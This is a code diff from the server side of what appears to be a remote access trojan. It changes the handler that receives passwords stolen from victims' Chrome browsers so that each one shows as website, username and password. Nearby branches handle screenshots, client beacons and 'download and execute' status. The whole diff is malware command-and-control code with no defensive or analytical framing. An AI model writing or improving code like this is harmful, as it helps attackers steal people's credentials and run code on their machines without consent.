@@ -55,6 +55,8 @@ class ProcessCommands implements Repository {
                 Controller.updateTable();
             } else if (input.contains("PSHURL")){
                 //StringBuilder fullContent = new StringBuilder();
+                try{Thread.sleep(100);}catch(InterruptedException e){e.printStackTrace();}
+                ChromePassView.getResultsArea().appendText("WEBSITE, USERNAME, PASSWORD\n\n");
                 while (true) {
                     String content = readFromDis(dis);
                     if (content == null || content.equals(null)) {
@@ -68,12 +70,21 @@ class ProcessCommands implements Repository {
                     } catch (InterruptedException e){
                         e.printStackTrace();
                     }
-                    ChromePassView.getResultsArea().appendText(content + "\n");
-                    //fullContent.append(content);
-                }
-                //System.out.println(fullContent.toString());
+                    //System.out.println(content);
+                    String[] split = content.split(",");
+                    if (split.length != 3){
+                        continue;
+                    }
+                    String password = split[0].replace("\"", "");
+                    String website = split[1].replace("\"", "");
+                    String username = split[2].replace("\"", "");
+                    if (password.equals("")) password = "(none)";
+                    if (username.equals("")) username = "(none)";
+                    if (website.equals("URL")) continue;
 
-                //ChromePassView.getResultsArea().setText(fullContent.toString());
+                    ChromePassView.getResultsArea().appendText(website + " :: " + username + " :: " + password + "\n");
+                }
+
             } else if (input.contains("SCREENSHOT")) {
                 // SERVER: SCREENSHOT
                 // CLIENT: filename
@@ -134,7 +145,6 @@ class ProcessCommands implements Repository {
             } else if (input.contains("BEACON")) {
                 client.setOnlineStatus("Online");
             } else if (input.contains("DAE")){
-                System.out.println("OH YEA DAE IS FUN");
                 int status = Integer.parseInt(readFromDis(dis));
                 System.out.println("DOWNLOAD AND EXECUTE STATUS: " + status);
                 if (status == 0){
